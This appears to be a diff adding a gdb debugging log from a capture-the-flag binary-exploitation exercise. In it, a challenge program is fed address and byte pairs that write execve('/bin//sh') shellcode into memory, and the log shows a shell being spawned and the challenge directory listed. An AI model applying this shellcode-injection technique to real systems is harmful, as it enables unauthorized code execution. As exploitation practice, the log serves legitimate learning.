@@ -1,0 +1,105 @@
+(gdb) x/10i 0x80485db-2
+   0x80485d9 <butterflySwag+66>:        jne    0x804859d <butterflySwag+6>
+   0x80485db <butterflySwag+68>:        xor    %eax,%eax
+   0x80485dd <butterflySwag+70>:        push   %eax
+   0x80485de <butterflySwag+71>:        push   $0x68732f2f
+   0x80485e3 <butterflySwag+76>:        push   $0x6e69622f
+   0x80485e8 <butterflySwag+81>:        mov    %esp,%ebx
+   0x80485ea <butterflySwag+83>:        push   %eax
+   0x80485eb <butterflySwag+84>:        push   %ebx
+   0x80485ec <butterflySwag+85>:        mov    %esp,%ecx
+   0x80485ee <butterflySwag+87>:        mov    $0xb,%al
+(gdb) c
+Continuing.
+
+Program terminated with signal SIGALRM, Alarm clock.
+The program no longer exists.
+(gdb) run
+Starting program: /home/miser/apprentice_www_9cc7495fae4a9b23db4c7595865af973 
+134514138
+194
+134514161
+128
+134514160
+205
+134514159
+11
+134514158
+176
+134514157
+225
+134514156
+137
+134514155
+83
+134514154
+80
+134514153
+227
+134514152
+137
+134514151
+110
+134514150
+105
+134514149
+98
+134514148
+47
+134514147
+104
+134514146
+104
+134514145
+115
+134514144
+47
+134514143
+47
+134514142
+104
+134514141
+80
+134514140
+192
+134514139
+49
+134515163
+0
+process 19368 is executing new program: /bin/bash
+warning: Could not load shared library symbols for linux-vdso.so.1.
+Do you need "set solib-search-path" or "set sysroot"?
+sh-4.3$ ls
+ThisIsTheRealOneNot.class                            km4.bin                natives_blob.bin
+ThisIsTheRealOneNot.java                             km5.bin                neophyte1.bin
+__pycache__                                          km6.bin                neophyte2.bin
+a.out                                                km7.bin                neophyte3.bin
+a1.bin                                               libc.so                neophyte4.bin
+appr1x.bin                                           libhello-jni.so        pillpusher
+apprentice_www_9cc7495fae4a9b23db4c7595865af973      libm.so                pty_spawn.py
+artisinal_assembly_0331fb4526b5ffee34f6ab66899bac0b  libscg.so              quick_a2f3cce1589f4fb6d339a785cfe78c4d
+audio_visual_receiver_code                           ltrace_butterfly4.txt  ratnet
+baby-re                                              ltrace_heap1.txt       ratnet1
+banker                                               ltrace_heap2.txt       scg.c
+banker_eh_frame.txt                                  ltrace_heap3.txt       shell
+banker_nolimit                                       n1.txt                 snapshot_blob.bin
+butterfly_33e86bcc2f0a21d57970dc6907867bed           n2.txt                 spawnbase.py
+core                                                 n3.txt                 swift
+eh_frame                                             n4.txt                 temp
+flag                                                 n5.bin                 tyro_heap_29d1e9341f35f395475bf16aa988e29b
+fuck.txt                                             n6.bin                 tyro_infoleak1_bdc3f08dab986b30317b0937a096d794
+gdb1.txt                                             n7.bin                 tyro_infoleak2_3a3b043ca422415917e99afdc20618e5
+kiss                                                 n7a.bin                tyro_infoleak3_b2d435964aac6bc1098ce62d35cba9af
+kissme.py                                            n7b.bin                uin.txt
+km1.bin                                              n8a.bin                unbreakable-enterprise-product-activation
+km2.bin                                              n9a.bin                x
+km3.bin                                              n9b.bin
+sh-4.3$ 
+Program received signal SIGINT, Interrupt.
+0x00007ffff7670b10 in __read_nocancel () from /lib64/libc.so.6
+(gdb) quit
+A debugging session is active.
+
+        Inferior 1 [process 19368] will be killed.
+
+Quit anyway? (y or n) y
